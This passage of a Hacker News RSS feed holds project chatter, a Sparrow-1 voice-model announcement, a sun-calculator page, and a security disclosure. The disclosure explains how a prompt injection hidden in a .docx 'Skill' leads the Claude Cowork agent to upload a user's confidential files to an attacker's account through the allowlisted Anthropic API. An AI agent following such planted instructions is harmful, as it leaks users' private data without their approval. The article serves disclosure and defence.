    &lt;p&gt;I am deep down into the rabbit hole of assessing various open source projects to build a custom trackball with a 52mm billiard ball (appropriately, it’s the 8-ball).&lt;/p&gt;
    &lt;p&gt;Published an edit today (post dated in Nov. but I've rewritten it 5x now) on my tutorial to use llama3.2:3b to generate fine tuning data to train tinyllama1.1b https://seanneilan.com/posts/fine-tuning-local-llm/ It took a while to figure out that when I made llama3.2 generate json, it didn't have enough horsepower to generate training data that was varied enough to successfully fine tune llama1.1b! Figured that out :) Something you never learn with the bigger models. Every token costs something even if it's a little bit.&lt;/p&gt;
    &lt;p&gt;Was reading about version control history and found out Git went from first commit to self-hosting in like a week. Linus was just mad about the BitKeeper licensing thing and hammered it out. Not some grand architecture - just "screw this, I'll do it myself." And somehow that became... everything. Wild.&lt;/p&gt;
    &lt;p&gt;Learned about superheterodyne receivers. Recently I've been studying up on RF technology, happened to come across superheterodyne receivers a short while ago, decided to research them today, saw that Technology Connections had a video on them, watched it, and felt reasonably enlightened.&lt;/p&gt;
    &lt;p&gt;I don't know about AI antennas, but smart antennas[1] are a things since more than 15 years. Basically they are array of antennas that can change via software the directivity (mainly used in radar systems) or increase/reduce power transmission and direction (this is used in 5G cell).&lt;/p&gt;
    &lt;p&gt;setup a desktop with n8n, ollama, open webui, comfyui, and aider. work is dragging it's feet on AI orchestration and workflow tooling so figured I learn it a bit to get ahead of things. just need some personal projects that are interesting enough that I'll pour time into them.&lt;/p&gt;
    &lt;p&gt;I'm exploring writing a point and click adventure, and I've found out that they're basically just hierarchical state machines with a pretty UI. This is useful because it simplifies a lot of things.&lt;/p&gt;
    &lt;p&gt;The downside is that now I'm wondering if I could write one in SQL.&lt;/p&gt;
    &lt;p&gt;That lodash-es doesn’t ESM lodash/fp, which means there is no straightforward way of using it with Vite after version 5. God help me.&lt;/p&gt;
    &lt;p&gt;I don’t even want to use it, I just want to get legacy code building on a modern version of Vite without rewriting a couple thousand lines of code. Aaaargh&lt;/p&gt;
    &lt;p&gt;Another fun fact - lodash/fp doesn't deduplicate with lodash when bundled. For a couple of months I was wondering why our app had bundled two copies of lodash. I dismissed it as a measurement artifact at first. It took so long to realize there was actually two copies of lodash and it was because one developer on our team had a preference for fp syntax.&lt;/p&gt;
    &lt;p&gt;I'm guessing you're only a few years into your web career, so I'll provide some background. lodash is a popular library that fills in many blanks that pre-2015 JavaScript had. It still provides value in modern JavaScript, but it's no longer as important as it used to be.&lt;/p&gt;
    &lt;p&gt;JavaScript is actually based on a standard called ECMAScript. ActionScript shares this standard, as an example. In 2015, we got ECMAScript 5, which modernized JavaScript in many ways. With that came many changes such as ECMAScript moving to a yearly update cadence, in response to the large amount of effort involved in implementing ES5, which came with a ton of changes.&lt;/p&gt;
    &lt;p&gt;One of those changes was ES modules, or ESM, which provided an official way for working with modules. The import/export syntax you're used to is a part of that spec. Before this, we had competing non-standard specifications for module loading, such as CommonJS.&lt;/p&gt;
    &lt;p&gt;ES5 reduced the need for tools such as lodash, and so it's less common in newer projects. It also is old enough to have been around before ESM was adopted, and is a large project, and so like many projects it either had to completely rewrite everything, or use transformation tools such as babel. If not, the user was responsible for using babel/etc to transform the code. Now, in modern stacks, because this is unnecessary, native support for CommonJS is being phased out, leading to OP's conundrum.&lt;/p&gt;
    &lt;p&gt;Now we have TypeScript, and the horrors of JavaScript 10+ years ago are a fading memory.&lt;/p&gt;
    &lt;p&gt;Nope, I'm about 15 years in and (unfortunately) deeply familiar with all of that. As someone else pointed out below, it was the use of ESM as a verb that threw me off.&lt;/p&gt;
    &lt;p&gt;Thanks for taking the effort to type out a history lesson though, hopefully someone will benefit from it.&lt;/p&gt;
    &lt;p&gt;I found out I can automate my 5,12kWh house battery through local-only RS485 connection, and directly setting registers using ModbusTCP from Home Assistant. I then drafted an automation with hysteresis and damping that tries to aim for Net-Zero export/import (pv surplus/grid). It appears to work!&lt;/p&gt;
    &lt;p&gt;What brand/make of battery is that? I'm tentatively interested in home battery storage, but definitely not interested in shit that requires an app, an internet connection, and shitty saas spyware...&lt;/p&gt;
    &lt;p&gt;I am cleaning up some pointer arithmetic stuff for multi-dimensional C style arrays. I managed to replace the code with a std::inner_product minus a std::accumulate (to accomodate for the fact that the upper array bound is exclusive, ie one-past-the-end).&lt;/p&gt;
    &lt;p&gt;For machine tools I just use an oil can with a finer than normal tapered tip, this will depress the ball bearing in zerk / grease nipple fittings no problems, this also works with the ball oilers typically found on lathes etc. You can cut a tiny slit in the end too if that helps get oil in https://www.wentztech.com/metalworking/projects/convert-a-ch...&lt;/p&gt;
    &lt;p&gt;I've read the adverserial attack paper, and I'm currently implementing a captcha based on images that have masks on them so that any LLM agent with a visual model will classify it wrong.&lt;/p&gt;
    &lt;p&gt;The idea is to use something like a slider that shows different images combined with a memory task, like "find out the pair of images" and then offer maybe a text input field where the user has to write 1,2,3 or something similar with the image numbers to pass the captcha.&lt;/p&gt;
    &lt;p&gt;The tldr is that I'm abusing the famous panda image that's classified as a gibbon as a technique to build a bot captcha.&lt;/p&gt;
    &lt;p&gt;I've been trying to research drone navigation tech from what we have learned so far from the russian/ukraine war. I'm very much not a hardware guy but software by itself has been feeling kind of useless or even crueler than usual.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46619464</guid><pubDate>Wed, 14 Jan 2026 17:54:25 +0000</pubDate></item><item><title>Show HN: Sparrow-1 – Audio-native model for human-level turn-taking without ASR</title><link>https://www.tavus.io/post/sparrow-1-human-level-conversational-timing-in-real-time-voice</link><description>&lt;doc fingerprint="34dbeb9a0b368fab"&gt;
  &lt;main&gt;
    &lt;p&gt;All Posts&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is a specialized, multilingual audio model for real-time conversational flow and floor transfer. It predicts when a system should listen, wait, or speak, enabling response timing that mirrors human conversation rather than simply responding as fast as possible.&lt;/p&gt;
    &lt;p&gt;Despite major advances in LLMs and TTS, conversational AI still lacks reliable human-level timing. Traditional voice systems wait for silence, then respond. Sparrow-1 instead models conversational timing continuously. This allows it to respond quickly, even instantaneously when the speaker is clearly done, all while deliberately waiting when theyâre not.&lt;/p&gt;
    &lt;p&gt;The difference is subtle but transformative: Sparrow-1 doesn't just respond as fast as possible. It responds at the moment a human listener would.&lt;/p&gt;
    &lt;head rend="h2"&gt;Timing Is the Hard Part&lt;/head&gt;
    &lt;p&gt;Conversation is not just an exchange of words. It is a real-time coordination task where participants continuously anticipate when to respond, drawing on rhythm, hesitation, intonation, and meaning at the same time. Sparrow-1 models this coordination directly, aligning its behavior with the timing patterns humans use subconsciously during dialogue.&lt;/p&gt;
    &lt;p&gt;Research in conversation analysis and psycholinguistics has identified several key categories of signals that govern conversational-flow:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Semantic completeness: whether an utterance constitutes a complete thought, question, or request that projects a relevant response.&lt;/item&gt;
      &lt;item&gt;Lexical structure: grammatical structure and speech act boundaries that create transition-relevance places.&lt;/item&gt;
      &lt;item&gt;Prosodic boundary markers: pitch contours, lengthening, and intensity changes that signal utterance completion.&lt;/item&gt;
      &lt;item&gt;Disfluencies and hesitation phenomena: filled pauses, false starts, and repairs that indicate ongoing cognitive processing.&lt;/item&gt;
      &lt;item&gt;Non-verbal cues are invisible to text: Transcription-based models discard sighs, throat-clearing, hesitation sounds, and other non-verbal vocalizations that carry critical conversational-flow information. Sparrow-1 hears what ASR ignores.&lt;/item&gt;
      &lt;item&gt;Overlap management: the negotiation of simultaneous speech, which occurs in approximately 40% of turn transitions.&lt;/item&gt;
      &lt;item&gt;Affective silences: pauses that carry emotional or pragmatic weight distinct from planning delays.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;When timing fails in conversational AI&lt;/head&gt;
    &lt;p&gt;When you talk to an AI with a human voice, you expect human timing. When timing breaks down, you notice immediately. Delayed responses, premature interruptions, and awkward pauses shatter the rhythm of natural dialogue.&lt;/p&gt;
    &lt;p&gt;Todayâs voice AI sounds increasingly human, yet still feels mechanical in conversation. Systems on platforms like ChatGPT, Claude, and Grok decide when to speak using endpoint detection, waiting for silence thresholds before responding. They react to the absence of sound rather than conversational intent, leading to missed hesitation cues and poorly timed responses. The voice sounds real, but the interaction does not.&lt;/p&gt;
    &lt;p&gt;Human-level conversation requires more:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Near-instant response when intent is clear&lt;/item&gt;
      &lt;item&gt;Contextual fluidity that adapts to pacing and tone&lt;/item&gt;
      &lt;item&gt;Graceful handling of interruptions, backchannels, and overlapping speech&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Most systems fall short since they treat conversational-flow as an afterthought, a threshold to tune rather than a problem to model.Â &lt;lb/&gt;Sparrow-1 takes a different approach: it models humanlike floor transfer with intent, timing, and tone, ensuring that conversational timing matches the realism of the voice delivering it.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Sparrow-1?&lt;/head&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is a conversational flow control model built for real-time conversational video in Tavusâs Conversational Video Interface. It treats timing as a first-class modeling problem rather than an artifact of endpoint detection, extending Sparrow-0 with a more capable architecture and richer supervision.&lt;/p&gt;
    &lt;p&gt;Most existing turn-taking systems are built around endpoint detection. They wait for speech to stop, apply silence thresholds, and then trigger a response. This reactive design introduces latency, misinterprets hesitation as turn completion, and fails to support natural conversational behaviors such as backchanneling, overlap, and interruption. Silence is treated as a proxy for intent, even though the absence of speech does not reliably signal that a speaker has yielded the conversational floor.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 takes a different approach. Instead of asking whether speech has ended, it models who owns the conversational floor at every moment, allowing it to anticipate turn transitions rather than react to them.&lt;/p&gt;
    &lt;head rend="h3"&gt;Core Properties and Capabilities&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Audio-native, streaming-first: Operates directly on continuous audio with persistent state, preserving prosody, rhythm, and timing cues that are lost in transcription-based systems.&lt;/item&gt;
      &lt;item&gt;Explicit floor ownership modeling: Predicts conversational floor ownership at frame-level granularity instead of relying on silence or fixed timeouts, enabling responses at the moment of handoff rather than after a delay buffer.&lt;/item&gt;
      &lt;item&gt;Trained on continuous utterances: Learns from real conversational streams where turn boundaries are probabilistic and context-dependent, reflecting the messiness of natural dialogue.&lt;/item&gt;
      &lt;item&gt;Designed for interruption and overlap: Actively reasons about hesitation, overlap, and mid-speech interruptions to decide whether to yield, pause, or continue speaking.&lt;/item&gt;
      &lt;item&gt;Speaker-adaptive in real time: Uses a recurrent architecture to converge on user-specific timing patterns within a single session, without explicit calibration or fine-tuning.&lt;/item&gt;
      &lt;item&gt;Optimized for latency and correctness: Responds immediately when intent is clear and deliberately waits when uncertainty remains, avoiding both interruptions and unnatural delays.&lt;/item&gt;
      &lt;item&gt;Enables speculative inference: Predicts floor transfer proactively, allowing downstream components to begin response generation before the user finishes speaking, committing or discarding output based on real-time floor predictions.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;A new architecture for conversational flow&lt;/head&gt;
    &lt;p&gt;Sparrow-1 is not a general language model or even strictly a turn-taking model. It is a timing and control system that governs when a conversational system should speak, wait, or get out of the way: a conversational-flow model&lt;/p&gt;
    &lt;p&gt;This distinction matters because conversational timing is not handled cleanly by most real-time voice architectures. Today, two dominant approaches exist:&lt;/p&gt;
    &lt;p&gt;End-to-end speech-to-speech models handle timing implicitly but are expensive, opaque, and difficult to control or customize. They achieve fluency by tightly coupling perception, reasoning, and generation, but sacrifice efficiency and controllability in the process.&lt;/p&gt;
    &lt;p&gt;Modular pipelines (ASR â LLM â TTS) are flexible and scalable but suffer from a coordination problem: timing decisions fall between components, with no dedicated mechanism for deciding when the system should speak.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 fills this gap. By explicitly modeling conversational floor transfer as a standalone timing and control layer, it brings human-level conversational-flow to modular pipelines, preserving their flexibility while restoring the conversational feel users expect.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarking Human ConversationÂ&lt;/head&gt;
    &lt;p&gt;Conversational-flow systems are often evaluated on clean endpoints and average latency, but these metrics are not representative of the true human dance, and miss the failures that matter most in real conversation: cutting users off, waiting too long, or behaving inconsistently during hesitation.Â&lt;/p&gt;
    &lt;p&gt;To evaluate these cases, we benchmarked Sparrow-1 against representative industry approaches using 28 challenging real world audio samples of real conversations designed to expose hesitation, overlap, and ambiguous turn endings, rather than clean silence.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Interpreting the Results&lt;/head&gt;
    &lt;p&gt;Each system was evaluated on the same set of 28 real-world conversational samples. Performance was measured across response latency, correct floor transfer, and interruptions. Correct floor transfer was measured using precision and recall within a 400ms grace window that reflects human conversational tolerance.&lt;/p&gt;
    &lt;p&gt;Correct floor transfer is quantified using precision and recall, with a 400ms grace window that reflects the tolerance humans naturally allow in conversation. Detections occurring within 400ms before a speaker finishes are treated as correct, while earlier responses are classified as interruptions. Precision captures how often a system avoids cutting users off, while recall measures how reliably it responds when a turn is actually complete.&lt;/p&gt;
    &lt;p&gt;Across existing approaches, the benchmark exposes a consistent speed and correctness tradeoff. Conservative systems minimize interruptions by waiting for extended silence, but impose multi-second delays that feel unnatural in dialogue. More aggressive systems reduce latency by lowering detection thresholds, but interrupt users frequently. In practice, systems are forced to choose between being slow or being wrong.&lt;/p&gt;
    &lt;p&gt;These results show that this tradeoff is not inherent to conversation, but a consequence of endpoint-based turn-taking design.&lt;/p&gt;
    &lt;head rend="h3"&gt;â&lt;/head&gt;
    &lt;head rend="h3"&gt;The Speed-Correctness Tradeoff&lt;/head&gt;
    &lt;p&gt;Existing systems force a choice between responsiveness and correctness:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Conservative approaches like LiveKit avoid most interruptions by waiting for extended silence, but impose unnatural delays. Median latency: 1504ms.&lt;/item&gt;
      &lt;item&gt;Aggressive approaches like Smart-Turn respond faster by lowering detection thresholds, but interrupt users frequently. Median latency: 237ms. Interruptions: 21 across 28 samples.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;â&lt;/head&gt;
    &lt;head rend="h3"&gt;Sparrow-1 Breaks the Tradeoff&lt;/head&gt;
    &lt;p&gt;Sparrow-1 avoids this compromise by responding quickly when a turn is complete and waiting when the user is still speaking, achieving both speed and correctness.&lt;/p&gt;
    &lt;p&gt;This performance reflects a fundamentally different approach. Sparrow-1 treats conversational flow as continuous, frame-level floor ownership prediction, aligning its behavior with human conversational timing.&lt;/p&gt;
    &lt;head rend="h3"&gt;Performance and Latency&lt;/head&gt;
    &lt;p&gt;Human conversation optimizes for appropriateness, not speed. People respond quickly when intent is clear and wait when meaning is uncertain.&lt;/p&gt;
    &lt;p&gt;Because Sparrow-1 models conversational certainty directly, its response latency is dynamic. It responds in under 100ms when confident and waits during hesitation or trailing speech, typically producing response times of 200 to 500ms without multi-second delays.&lt;/p&gt;
    &lt;p&gt;This ability to be simultaneously fast and patient creates the perception of zero-latency conversation. The system responds not as quickly as possible, but at the moment it should.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;Modeling human-like turn-taking behavior&lt;/head&gt;
    &lt;p&gt;These design choices manifest as concrete runtime behaviors that govern how Sparrow-1 adapts, interrupts, and listens during live conversation. At runtime, turn-taking emerges from continuous speaker adaptation, interruption-aware control, and audio-native perception rather than fixed rules or thresholds. The result is behavior that closely matches how humans manage conversational flow in practice.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Adaptation without fine-tuning&lt;/head&gt;
    &lt;p&gt;Sparrow-1 behaves as a meta in-context learner, adapting to individual speaking patterns continuously as a conversation unfolds. Using a recurrent architecture, each 40ms frame updates internal state that encodes prosody, pacing, historical turn timing, and response latency preferences.&lt;/p&gt;
    &lt;p&gt;Early in a conversation, the model operates with higher uncertainty. As evidence accumulates, predictions sharpen around user-specific patterns, producing progressive synchronization without explicit calibration.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Interruption handling&lt;/head&gt;
    &lt;p&gt;Interruptions are treated as first-class conversational signals. Incoming speech during system output immediately pauses playback while the model continues evaluating floor ownership. If confidence rises, Sparrow-1 yields the turn. If not, it resumes speaking. This process distinguishes intentional interruptions from incidental overlap within tens of milliseconds without introducing delay.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Listening beyond words&lt;/head&gt;
    &lt;p&gt;Sparrow-1 models conversational intent using acoustic and temporal cues that extend beyond lexical content: interpreting not just what is said, but how it is said:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fillers and hesitations: Vocalizations such as "uh," "um," and partial restarts that signal cognitive load or turn-holding.&lt;/item&gt;
      &lt;item&gt;Trailing vocalizations: Soft completions, rising tones, or fading energy that indicate uncertainty or invite response.&lt;/item&gt;
      &lt;item&gt;Prosodic rhythm: Variations in pacing, pause structure, and intonation that distinguish finished thoughts from mid-utterance pauses.&lt;/item&gt;
      &lt;item&gt;Emotional cadence: Patterns in energy, timing, and speech continuity that reflect speaker engagement and conversational stance.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By incorporating these paralinguistic signals into its floor predictions, Sparrow-1 aligns with how humans naturally infer attention, hesitation, and intent during conversation: resulting in listening that feels responsive rather than reactive.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;Access and Closing&lt;/head&gt;
    &lt;p&gt;We built Sparrow-1 as part of a broader mission: teaching machines to participate in human conversation. Our Conversational Video Interface (CVI) powers AI experiences that look, sound, and interact like real people: and poor timing breaks that illusion faster than almost anything else.&lt;/p&gt;
    &lt;p&gt;In conversational AI, the uncanny valley is rarely about what the AI says. It's about when it says it. Responses that arrive too early feel rude; too late, artificial. In conversational video, these errors are amplified, reminding users they're speaking to a system rather than a partner.&lt;/p&gt;
    &lt;p&gt;We use Sparrow-1 to solve this at the level it must be solved: as a first-class timing and control system. By modeling conversational uncertainty directly and responding with human-like precision, it enables interactions that feel attentive, patient, and natural.&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is now available to GA across the Tavus APIs and platform, and already powers conversational experiences in the Tavus PALs and enterprise deployments.&lt;/p&gt;
    &lt;p&gt;Try the demo at tavus.io and learn more in our docs.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46619614</guid><pubDate>Wed, 14 Jan 2026 18:01:23 +0000</pubDate></item><item><title>Claude Cowork exfiltrates files</title><link>https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files</link><description>&lt;doc fingerprint="34890ebe6fffce0b"&gt;
  &lt;main&gt;
    &lt;p&gt;Threat Intelligence&lt;/p&gt;
    &lt;head rend="h1"&gt;Claude Cowork Exfiltrates Files&lt;/head&gt;
    &lt;p&gt;Claude Cowork is vulnerable to file exfiltration attacks via indirect prompt injection as a result of known-but-unresolved isolation flaws in Claude's code execution environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context&lt;/head&gt;
    &lt;p&gt;Two days ago, Anthropic released the Claude Cowork research preview (a general-purpose AI agent to help anyone with their day-to-day work). In this article, we demonstrate how attackers can exfiltrate user files from Cowork by exploiting an unremediated vulnerability in Claudeâs coding environment, which now extends to Cowork. The vulnerability was first identified in Claude.ai chat before Cowork existed by Johann Rehberger, who disclosed the vulnerability â it was acknowledged but not remediated by Anthropic. &lt;lb/&gt;Anthropic warns users, âCowork is a research preview with unique risks due to its agentic nature and internet access.â Users are recommended to be aware of âsuspicious actions that may indicate prompt injectionâ. However, as this feature is intended for use by the general populace, not just technical users, we agree with Simon Willisonâs take:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;âI do not think it is fair to tell regular non-programmer users to watch out for 'suspicious actions that may indicate prompt injectionâ!â&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;As Anthropic has acknowledged this risk and put it on users to âavoid granting access to local files with sensitive informationâ (while simultaneously encouraging the use of Cowork to organize your Desktop), we have chosen to publicly disclose this demonstration of a threat users should be aware of. By raising awareness, we hope to enable users to better identify the types of âsuspicious actionsâ mentioned in Anthropicâs warning.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Attack Chain&lt;/head&gt;
    &lt;p&gt;This attack leverages the allowlisting of the Anthropic API to achieve data egress from Claude's VM environment (which restricts most network access).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The victim connects Cowork to a local folder containing confidential real estate files&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The victim uploads a file to Claude that contains a hidden prompt injection&lt;/p&gt;&lt;lb/&gt;For general use cases, this is quite common; a user finds a file online that they upload to Claude code. This attack is not dependent on the injection source - other injection sources include, but are not limited to: web data from Claude for Chrome, connected MCP servers, etc. In this case, the attack has the file being a Claude âSkillâ (although, as mentioned, it could also just be a regular document), as it is a generalizable file convention that users are likely to encounter, especially when using Claude.&lt;lb/&gt;Note: If you are familiar with Skills, they are canonically Markdown files (which users often do not heavily scrutinize). However, we demonstrate something more interesting: here, the user uploads a .docx (such as may be shared on an online forum), which poses as a Skill - the contents appear to be Markdown that was just saved after editing in Word. In reality, this trick allows attackers to conceal the injection using 1-point font, white-on-white text, and with line spacing set to 0.1 â making it effectively impossible to detect.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The victim asks Cowork to analyze their files using the Real Estate âskillâ they uploaded&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The injection manipulates Cowork to upload files to the attackerâs Anthropic account&lt;/p&gt;&lt;lb/&gt;The injection tells Claude to use a âcurlâ command to make a request to the Anthropic file upload API with the largest available file. The injection then provides the attackerâs API key, so the file will be uploaded to the attackerâs account.&lt;lb/&gt;At no point in this process is human approval required.&lt;p&gt;If we expand the 'Running command' block, we can see the malicious request in detail:&lt;/p&gt;&lt;p&gt;Code executed by Claude is run in a VM - restricting outbound network requests to almost all domains - but the Anthropic API flies under the radar as trusted, allowing this attack to complete successfully.&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The attackerâs account contains the victim's file, allowing them to chat with it&lt;/p&gt;
        &lt;p&gt;The exfiltrated file contains financial figures and PII, including partial SSNs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;A Note on Model-specific Resilience&lt;/head&gt;
    &lt;p&gt;The above exploit was demonstrated against Claude Haiku. Although Claude Opus 4.5 is known to be more resilient against injections, Opus 4.5 in Cowork was successfully manipulated via indirect prompt injection to leverage the same file upload vulnerability to exfiltrate data in a test that considered a 'user' uploading a malicious integration guide while developing a new AI tool:&lt;/p&gt;
    &lt;p&gt;As the focus of this article was more for everyday users (and not developers), we opted to demonstrate the above attack chain instead of this one.&lt;/p&gt;
    &lt;head rend="h3"&gt;DOS via Malformed Files&lt;/head&gt;
    &lt;p&gt;An interesting finding: Claude's API struggles when a file does not match the type it claims to be. When operating on a malformed PDF (ends .pdf, but it is really a text file with a few sentences in it), after trying to read it once, Claude starts throwing an API error in every subsequent chat in the conversation.&lt;/p&gt;
    &lt;p&gt;We posit that it is likely possible to exploit this failure via indirect prompt injection to cause a limited denial of service attack (e.g., an injection can elicit Claude to create a malformed file, and then read it). Uploading the malformed file via the files API resulted in notifications with an error message, both in the Claude client and the Anthropic Console.&lt;/p&gt;
    &lt;head rend="h3"&gt;Agentic Blast Radius&lt;/head&gt;
    &lt;p&gt;One of the key capabilities that Cowork was created for is the ability to interact with one's entire day-to-day work environment. This includes the browser and MCP servers, granting capabilities like sending texts, controlling one's Mac with AppleScripts, etc. &lt;lb/&gt;These functionalities make it increasingly likely that the model will process both sensitive and untrusted data sources (which the user does not review manually for injections), making prompt injection an ever-growing attack surface. We urge users to exercise caution when configuring Connectors. Though this article demonstrated an exploit without leveraging Connectors, we believe they represent a major risk surface likely to impact everyday users.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46622328</guid><pubDate>Wed, 14 Jan 2026 20:12:25 +0000</pubDate></item><item><title>Sun Position Calculator</title><link>https://drajmarsh.bitbucket.io/earthsun.html</link><description>&lt;doc fingerprint="bed548565997f32c"&gt;
  &lt;main&gt;
    &lt;p&gt; This page requires a reasonably modern HTML5 browser &lt;lb/&gt;with both Javascript and WebGL enabled. &lt;/p&gt;
    &lt;p&gt; If this message is not soon replaced by an interactive 3D model, &lt;lb/&gt;then it is likely that your browser does not support this web app. &lt;lb/&gt;Check your JavaScript Console for specific error messages. &lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;SITE LOCATION&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Latitude:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Longitude:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Timezone:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DATE AND TIME&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Date:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Time:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;SOLAR INFORMATION&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Azi / Alt:&lt;/cell&gt;
        &lt;cell&gt;/&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Rise / Set:&lt;/cell&gt;
        &lt;cell&gt;/&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Daylight:&lt;/cell&gt;
        &lt;cell&gt;Hrs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;TWILIGHT TIMES&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Civil:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Nautical:&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Astronom.:&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;head&gt;Projection (Shortcut keys: 1 to 6)&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"/&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;Show a white background without stars to make screen captures better for printed mediums.&lt;/p&gt;
    &lt;p&gt;Highlights the latitude and longitude angles of the current site to clearly show how positions on the Earth's surface are specified.&lt;/p&gt;
    &lt;p&gt;Displays an illustrative beam of light illuminating the Earth directly from the Sun. This can be useful for more clearly indicating the direction of the Sun.&lt;/p&gt;
    &lt;p&gt;A short animation that shows how the Arctic and Antarctic circles mark the extremes of night and day at each season.&lt;/p&gt;
    &lt;p&gt;Another short animation that shows the tropics of Cancer and Capricorn as the extremes of solar declination angle at each of the solstices.&lt;/p&gt;
    &lt;p&gt;An orthographic view where the azimuth and altitude of the camera is locked relative to the current Sun direction and changes dynamically whenever solar position changes. Click again to increment the angle, or select a different view in VIEW SETTINGS to unlock it.&lt;/p&gt;
    &lt;p&gt;An orthographic side view at right angles to the site longitude, which is useful when explaining the effect of latitude as well as seasonal changes in solar altitude. Click again to swap sides or select a different view in VIEW SETTINGS to unlock it.&lt;/p&gt;
    &lt;table&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt;The aim of this app is to model the orbital relationship between the Earth and the Sun that results in what we see as relative solar motion. As well as displaying a full 3D Sun-path diagram at the selected site location, you can easily switch between geo-centric and helio-centric views as well as overlaying some information useful for understanding various characteristics of the relationship.&lt;/p&gt;
    &lt;p&gt;For example, turn on the 'Twilight' and 'Circles' overlays and then select 'Summer Soltice' in the 'Useful Dates' menu (). Click the 'Play' button () to animate the time and then look at the North and South poles to clearly see why the Arctic and Antarctic Circles are located where they are. You can do something similar with the 'Sub-Solar' and 'Tropics' options. There are several more that are worth exploring for yourself, such as looking at the Sun-path as you adjust the site latitude and seeing how Declination angle changes with date. Worth it if you can spend a bit of time playing around and experimenting with the model.&lt;/p&gt;
    &lt;p&gt;This is another HTML5 version of one of my Java applets in Processing. Having recently done some low-level optimisation of my solar calculations, I needed a better way to actually see the code in action and to interactively put it through its paces. Even the most extensive test suite is never a substitute for a good hands-on visualisation.&lt;/p&gt;
    &lt;p&gt;Just doing this app I found really useful and even insightful. Working out different ways to show the various characteristics and how best to handle the two planetary projections actually changed how I thought about the calculations and led to some useful improvements. Hopefully some others might find it similarly useful as a way of better understanding solar motion.&lt;/p&gt;
    &lt;p&gt;The following are some of the more interesting features of this app that I had quite a bit of fun implementing:&lt;/p&gt;
